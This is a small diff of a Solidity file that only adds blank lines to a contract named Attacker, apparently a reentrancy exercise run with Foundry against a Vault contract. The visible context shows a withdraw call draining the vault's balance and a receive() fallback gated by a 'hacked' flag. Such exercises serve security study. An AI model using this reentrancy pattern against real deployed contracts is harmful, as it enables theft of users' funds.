@@ -1,5 +1,6 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
+
 import {Vault} from "./Vault.sol";
 import {console} from "forge-std/console.sol";
 
@@ -17,6 +18,7 @@ contract Attacker {
         vault.withdraw(address(vault).balance);
         console.log("Attacker balance4", address(this).balance);
     }
+
     receive() external payable {
         if (!hacked) {
             hacked = true;
